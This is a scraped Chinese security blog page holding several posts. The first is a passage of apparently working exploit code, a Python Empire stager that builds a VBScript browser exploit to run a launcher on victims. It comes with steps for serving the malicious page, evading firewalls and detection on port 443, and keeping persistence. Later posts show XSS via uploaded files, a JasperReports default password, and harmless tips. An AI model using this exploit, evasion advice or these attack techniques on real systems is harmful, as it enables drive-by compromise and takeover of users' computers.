class="string">"            End Sub\n"</span></div><div class="line">			code += <span class="string">"			\n"</span></div><div class="line">			code += <span class="string">"            Public Sub Resize()\n"</span></div><div class="line">			code += <span class="string">"                ReDim Preserve A(1, 1)\n"</span></div><div class="line">			code += <span class="string">"            End Sub\n"</span></div><div class="line">			code += <span class="string">"        End Class\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"        Class Dummy\n"</span></div><div class="line">			code += <span class="string">"        End Class\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"        Function getAddr (arg1, s)\n"</span></div><div class="line">			code += <span class="string">"            aw = Null\n"</span></div><div class="line">			code += <span class="string">"            Set aw = New ArrayWrapper\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            For i = 0 To 32\n"</span></div><div class="line">			code += <span class="string">"                Set plunge(i) = s\n"</span></div><div class="line">			code += <span class="string">"            Next\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            Set aw.A(arg1, 2) = s\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            Dim addr\n"</span></div><div class="line">			code += <span class="string">"            Dim i\n"</span></div><div class="line">			code += <span class="string">"            For i = 0 To 31\n"</span></div><div class="line">			code += <span class="string">"                If Asc(Mid(y(i), 3, 1)) = VarType(s) Then\n"</span></div><div class="line">			code += <span class="string">"                   addr = strToInt(Mid(y(i), 3 + 4, 2))\n"</span></div><div class="line">			code += <span class="string">"                End If\n"</span></div><div class="line">			code += <span class="string">"                y(i) = Null\n"</span></div><div class="line">			code += <span class="string">"            Next\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            If addr = Null Then\n"</span></div><div class="line">			code += <span class="string">"                document.location.href = document.location.href\n"</span></div><div class="line">			code += <span class="string">"                Return\n"</span></div><div class="line">			code += <span class="string">"            End If\n"</span></div><div class="line">			code += <span class="string">"            getAddr = addr\n"</span></div><div class="line">			code += <span class="string">"        End Function\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"        Function leakMem (arg1, addr)\n"</span></div><div class="line">			code += <span class="string">"            d = prefix &amp; \"%u0008%u4141%u4141%u4141\"\n"</span></div><div class="line">			code += <span class="string">"            c = d &amp; intToStr(addr) &amp; b\n"</span></div><div class="line">			code += <span class="string">"            x = UnEscape(c)\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            aw = Null\n"</span></div><div class="line">			code += <span class="string">"            Set aw = New ArrayWrapper\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            Dim o\n"</span></div><div class="line">			code += <span class="string">"            o = aw.A(arg1, 2)\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            leakMem = o\n"</span></div><div class="line">			code += <span class="string">"        End Function\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"        Sub overwrite (arg1, addr)\n"</span></div><div class="line">			code += <span class="string">"            d = prefix &amp; \"%u400C%u0000%u0000%u0000\"\n"</span></div><div class="line">			code += <span class="string">"            c = d &amp; intToStr(addr) &amp; b\n"</span></div><div class="line">			code += <span class="string">"            x = UnEscape(c)\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            aw = Null\n"</span></div><div class="line">			code += <span class="string">"            Set aw = New ArrayWrapper\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            aw.A(arg1, 2) = CSng(0)\n"</span></div><div class="line">			code += <span class="string">"        End Sub\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"        Function exploit (arg1)\n"</span></div><div class="line">			code += <span class="string">"            Dim addr\n"</span></div><div class="line">			code += <span class="string">"            Dim csession\n"</span></div><div class="line">			code += <span class="string">"            Dim olescript\n"</span></div><div class="line">			code += <span class="string">"            Dim mem\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            Set dm = New Dummy\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            addr = getAddr(arg1, dm)\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            mem = leakMem(arg1, addr + 8)\n"</span></div><div class="line">			code += <span class="string">"            csession = strToInt(Mid(mem, 3, 2))\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            mem = leakMem(arg1, csession + 4)\n"</span></div><div class="line">			code += <span class="string">"            olescript = strToInt(Mid(mem, 1, 2))\n"</span></div><div class="line">			code += <span class="string">"            overwrite arg1, olescript + &amp;H174\n"</span></div><div class="line">			code += <span class="string">"	    Set Object = CreateObject(\"Wscript.Shell\")\n"</span></div><div class="line">			code +=	<span class="string">"		Object.run(\""</span></div><div class="line">			code += 		launcher + 	<span class="string">"\")\n"</span></div><div class="line">			code += <span class="string">"        End Function\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"        Function triggerBug\n"</span></div><div class="line">			code += <span class="string">"            aw.Resize()\n"</span></div><div class="line">			code += <span class="string">"            Dim i\n"</span></div><div class="line">			code += <span class="string">"            For i = 0 To 32\n"</span></div><div class="line">			code += <span class="string">"                ' 24000x2 + 6 = 48006 bytes\n"</span></div><div class="line">			code += <span class="string">"                y(i) = Mid(x, 1, 24000)\n"</span></div><div class="line">			code += <span class="string">"            Next\n"</span></div><div class="line">			code += <span class="string">"        End Function\n"</span></div><div class="line">			code += <span class="string">"    &lt;/script&gt;\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"    &lt;script type=\"text/javascript\"&gt;\n"</span></div><div class="line">			code += <span class="string">"        function strToInt(s)\n"</span></div><div class="line">			code += <span class="string">"        &#123;\n"</span></div><div class="line">			code += <span class="string">"            return s.charCodeAt(0) | (s.charCodeAt(1) &lt;&lt; 16);\n"</span></div><div class="line">			code += <span class="string">"        &#125;\n"</span></div><div class="line">			code += <span class="string">"        function intToStr(x)\n"</span></div><div class="line">			code += <span class="string">"        &#123;\n"</span></div><div class="line">			code += <span class="string">"            return String.fromCharCode(x &amp; 0xffff) + String.fromCharCode(x &gt;&gt; 16);\n"</span></div><div class="line">			code += <span class="string">"        &#125;\n"</span></div><div class="line">			code += <span class="string">"        var o;\n"</span></div><div class="line">			code += <span class="string">"        o = &#123;\"valueOf\": function () &#123;\n"</span></div><div class="line">			code += <span class="string">"                triggerBug();\n"</span></div><div class="line">			code += <span class="string">"                return 1;\n"</span></div><div class="line">			code += <span class="string">"            &#125;&#125;;\n"</span></div><div class="line">			code += <span class="string">"        setTimeout(function() &#123;exploit(o);&#125;, 50);\n"</span></div><div class="line">			code += <span class="string">"    &lt;/script&gt;\n"</span></div><div class="line">			code += <span class="string">"&lt;/body&gt;\n"</span></div><div class="line">			code += <span class="string">"&lt;/html&gt;"</span></div><div class="line"></div><div class="line">	<span class="keyword">return</span> code</div></pre></td></tr></table></figure>
<p>ms16.py</p>
<p>首先我们可以从<a href="https://github.com/PowerShellEmpire/Empire" target="_blank" rel="external">Github</a>获取Empire</p>
<p><img src="https://i0.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/1.png?resize=661%2C418&amp;ssl=1" alt="Empire Downloading"></p>
<p>现在我们已经下载了Empire，接下来我们要安装apache2以便于我们把索引页面直接放到/var/www/html路径下。这一步是可选的，因为大多数人都想改变输出位置，模糊它来逃避杀毒引擎或者类似的产品。</p>
<p><img src="https://i1.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/2.png?resize=661%2C418&amp;ssl=1" alt="Installing Apache2"><br>接下来该添加我们的新规则了。这需要将脚本放在/lib/stagers下并且运行Empire的install.sh脚本去添加并运行它。如果你的运行在Ubuntu环境中，你可能要在运行这些脚本之前去安装pip。</p>
<p><img src="https://i0.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/3.png?resize=661%2C418&amp;ssl=1" alt="Empire Installation"><br>现在我们已经准备好并要第一次去启动Empire了。如果一切都顺利的话我们应该可以去使用我们添加的ms16脚本、设置我们的输出文件到/var/www/html/index.html并且放置直接目标到其中。更高级的用户可能想要去设置一些稍微复杂的到服务中来利用不同客户或不同的向量来混淆视听，这些就已经超出本文要描述的范围了。</p>
<p>我个人更偏向于设置443端口的监听以期bypass一些防火墙并逃避一些检测机制。</p>
<p><img src="https://i0.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/4.png?resize=925%2C546&amp;ssl=1" alt="Empire Listener"><br>现在去生成我们的恶意HTML</p>
<p><img src="https://i1.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/5.png?resize=925%2C546&amp;ssl=1" alt="Stager Generation"></p>
<p>现在当你的服务被某个使用带有相关漏洞浏览器的用户浏览的时候，这个攻击载荷将被触发同时你将看到一个新的代理在Empire中。使用持久性模块创建任务通常是个好注意，相似的也可以确保你不因为重新启动而丢失权限。这些可以通过设置自动运行的代理从而设置为自动运行一个新的客户端连接。</p>
<p><img src="https://i1.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/7.png?resize=925%2C546&amp;ssl=1" alt="New Agent"></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/XSS姿势——文件上传XSS/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="ZEROYU">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="ZEROYU">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/01/22/XSS姿势——文件上传XSS/" itemprop="url">
                  XSS姿势——文件上传XSS
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T11:20:58+08:00">
                2017-01-22
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2017/01/22/XSS姿势——文件上传XSS/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/XSS姿势——文件上传XSS/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          

          
          
             <span id="/2017/01/22/XSS姿势——文件上传XSS/" class="leancloud_visitors" data-flag-title="XSS姿势——文件上传XSS">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="0x01-简单介绍"><a href="#0x01-简单介绍" class="headerlink" title="0x01 简单介绍"></a>0x01 简单介绍</h1><hr>
<p>一个文件上传点是执行XSS应用程序的绝佳机会。很多网站都有用户权限上传个人资料图片的上传点，你有很多机会找到相关漏洞。如果碰巧是一个self XSS，你可以看看这篇文章。</p>
<h1 id="0x02-实例分析"><a href="#0x02-实例分析" class="headerlink" title="0x02 实例分析"></a>0x02 实例分析</h1><hr>
<p>首先基本上我们都可以找到类似下面的一个攻击入口点，我觉得这个并不难。</p>
<h3 id="姿势一：文件名方式"><a href="#姿势一：文件名方式" class="headerlink" title="姿势一：文件名方式"></a>姿势一：文件名方式</h3><p>文件名本身可能会反映在页面所以一个带有XSS命名的文件便可以起到攻击作用。</p>
<p><img src="http://static.wooyun.org/upload/image/201604/2016041510130259461.gif" alt="p1"></p>
<p>虽然我没有准备靶场，但是你可以选择在<a href="http://www.w3schools.com/jsref/tryit.asp?filename=tryjsref_fileupload_value" target="_blank" rel="external">W3Schools</a>练习这种XSS 。</p>
<h3 id="姿势二：Metadata"><a href="#姿势二：Metadata" class="headerlink" title="姿势二：Metadata"></a>姿势二：Metadata</h3><p>使用<a href="http://www.sno.phy.queensu.ca/~phil/exiftool/" target="_blank" rel="external">exiftool</a>这个工具可以通过改变EXIF  metadata进而一定几率引起某处反射：</p>
<p>例如：</p>
<p><img src="http://static.wooyun.org//drops/20160414/2016041415305935841.jpg" alt="p2"></p>
<h3 id="姿势三：Content"><a href="#姿势三：Content" class="headerlink" title="姿势三：Content"></a>姿势三：Content</h3><p>如果应用允许上传SVG格式的文件（其实就是一个图像类型的），那么带有以下content的文件可以被用来触发XSS：</p>
<p>一个 PoC用来验证。你可以通过访问brutelogic.com.br/poc.svg看到效果</p>
<h3 id="姿势四：Source"><a href="#姿势四：Source" class="headerlink" title="姿势四：Source"></a>姿势四：Source</h3><p>建立一个携带有JavaScript payload的GIF图像用作一个脚本的源。这对绕过CSP（内容安全策略）保护“script-src ‘self’”（即不允许使用示例的这种xss方式进行攻击<code>alert(1)</code>）是很有用的，但前提是我们能够成功地在相同的域注入，如下所示。</p>
<p><img src="http://static.wooyun.org//drops/20160415/2016041501523324712.gif" alt="p3"></p>
<p>要创建这样的图像需要这个作为content 和 name，并使用.gif扩展名：</p>
<p>这个GIF的图片头——GIF89a，作为alert function的变量分配给alert function。但是他们之间，还有一个被标注的XSS变量用来防止图片被恢复为text/HTML MIME文件类型，因此只需发送一个对这个文件的请求payload 就可以被执行。</p>
<p>正如我们下面看到的，文件类unix命令和PHP函数中的exif_imagetype（）和getimagesize（）会将其识别为一个GIF文件。所以如果一个应用程序仅仅是使用这些方式验证是否是一个图像，那么该文件将可以上传成功（但可能在上传后被杀掉）。</p>
<p><img src="http://static.wooyun.org//drops/20160414/2016041415280360223pic42.png" alt="p4"></p>
<h1 id="0x03-最后"><a href="#0x03-最后" class="headerlink" title="0x03 最后"></a>0x03 最后</h1><hr>
<p>如果你想知道更多的有其标志性ASCII字符可以用于一个javascript变量赋值的文件类型，看我随后的文章。</p>
<p>也有很多比较详细的使用XSS和图像文件相结合绕过图形处理函数库过滤的例子。这方面的一个很好的例子是<a href="https://github.com/d0lph1n98/Defeating-PHP-GD-imagecreatefromgif" target="_blank" rel="external">here</a></p>
<p>原文链接：<a href="http://brutelogic.com.br/blog/" target="_blank" rel="external">http://brutelogic.com.br/blog/</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/PNG文件中的LSB隐写/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="ZEROYU">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="ZEROYU">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/01/22/PNG文件中的LSB隐写/" itemprop="url">
                  PNG文件中的LSB隐写
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T11:19:59+08:00">
                2017-01-22
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2017/01/22/PNG文件中的LSB隐写/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/PNG文件中的LSB隐写/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          

          
          
             <span id="/2017/01/22/PNG文件中的LSB隐写/" class="leancloud_visitors" data-flag-title="PNG文件中的LSB隐写">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>看到<a href="http://www.mottoin.com/88380.html" target="_blank" rel="external">Mott</a><a href="http://www.mottoin.com/88380.html" target="_blank" rel="external">oIn</a>的一篇文章时关于LSB隐写的，正好赶上中秋攒了一堆月饼没处放，就想由此出个题送送月饼。</p>
<p>环境：<strong>win10        python27</strong></p>
<p>lsb脚本使用了<a href="https://github.com/cyberinc/cloacked-pixel" target="_blank" rel="external">https://github.com/cyberinc/cloacked-pixel</a></p>
<p>在使用之前需要几个python包，主要说下win10下如何安装这些包</p>
<p><strong>1.PIL</strong></p>
<p>这个包你按廖雪峰官网上的方法可能安装不上，所以我给出我自己的解决办法：</p>
<p>到<a href="https://pypi.python.org/pypi/Pillow/2.7.0找到exe安装包双击" target="_blank" rel="external">https://pypi.python.org/pypi/Pillow/2.7.0找到exe安装包双击</a></p>
<p>主要是PIL官方编译包有bug，所以最好下载第三方组织编译包，强烈推荐pillow的确好用</p>
<p><strong>2.matplotlib</strong></p>
<p>这个包的安装直接参考官方网站的方法，注意一步一步来。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">python -m pip install --upgrade pip</div><div class="line">python -m pip install --upgrade numpy</div><div class="line">python -m pip install --upgrade pytz</div><div class="line">python -m pip install --upgrade pyparsing</div><div class="line">python -m pip install --upgrade cycler</div><div class="line">python -m pip install --upgrade matplotlib</div></pre></td></tr></table></figure>
<p>这就ok了，很简单。</p>
<p>接下来按照MottoIn这个玩就好了。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/win10只有edge可以打开网页/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="ZEROYU">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="ZEROYU">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/01/22/win10只有edge可以打开网页/" itemprop="url">
                  win10只有edge可以打开网页
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T11:19:37+08:00">
                2017-01-22
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2017/01/22/win10只有edge可以打开网页/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/win10只有edge可以打开网页/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          

          
          
             <span id="/2017/01/22/win10只有edge可以打开网页/" class="leancloud_visitors" data-flag-title="win10只有edge可以打开网页">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>按住win+x</p>
<p>然后选择“命令提示符（管理员）”</p>
<p>输入 netsh winsock reset</p>
<p>重启就好了。。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/figlet-一款很好用的生成字符画的工具/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="ZEROYU">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="ZEROYU">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/01/22/figlet-一款很好用的生成字符画的工具/" itemprop="url">
                  figlet--一款很好用的生成字符画的工具
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T11:05:35+08:00">
                2017-01-22
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2017/01/22/figlet-一款很好用的生成字符画的工具/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/figlet-一款很好用的生成字符画的工具/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          

          
          
             <span id="/2017/01/22/figlet-一款很好用的生成字符画的工具/" class="leancloud_visitors" data-flag-title="figlet--一款很好用的生成字符画的工具">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>安装：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install figlet</div></pre></td></tr></table></figure>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/flight.png" alt="1"></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/北京之行的感悟/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="ZEROYU">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="ZEROYU">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/01/22/北京之行的感悟/" itemprop="url">
                  北京之行的感悟
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T11:04:35+08:00">
                2017-01-22
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2017/01/22/北京之行的感悟/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/北京之行的感悟/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          

          
          
             <span id="/2017/01/22/北京之行的感悟/" class="leancloud_visitors" data-flag-title="北京之行的感悟">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>​    已经很晚了，一般是不写这种文章的，但这次去北京的确有很多收获和感悟，所以想在此记录一下。</p>
<p>​    这次北京之行的路演，依旧按照平时的答辩模式，最终也取得了不错的效果。百度的负责人对我们团队印象很深，也是三人团队的配合还不错，所以 最终也取得了不错的成绩。当然这次收获最大的并不是我们团队的表现，而是其它大学的。北邮的乐享奇迹科技有限公司给我的印象很深，他们有一个很完善的团队组织架构，并且基于一个预约平台衍生出了很多APP；还有第二组那个研究生基于原来学长的东西进一步完善，这也是一个思路；而后就是那个博士生的盲人系统，很有想法；最后是那个外卖APP，市场调查做的很详细。</p>
<p>​    总之，我觉得，对于社团而言也可以开发一些这种核心的东西作为一种积累；还有就是成立公司。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/Hacking-JasperReports-隐藏shell的特征/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="ZEROYU">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="ZEROYU">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/01/22/Hacking-JasperReports-隐藏shell的特征/" itemprop="url">
                  Hacking JasperReports-隐藏shell的特征
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T10:59:14+08:00">
                2017-01-22
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2017/01/22/Hacking-JasperReports-隐藏shell的特征/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/Hacking-JasperReports-隐藏shell的特征/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          

          
          
             <span id="/2017/01/22/Hacking-JasperReports-隐藏shell的特征/" class="leancloud_visitors" data-flag-title="Hacking JasperReports-隐藏shell的特征">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>不久前，我的同事跟我在对一个客户端进行渗透测试。我们确实发现的一件事是,他们留下了几个联网的JasperReports服务器。寻找默认管理帐户的用户名并没有花费太多的精力。<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/login.png?w=960" alt="login"></p>
<p>也没有用多久我们就猜解出密码是“jasperadmin”</p>
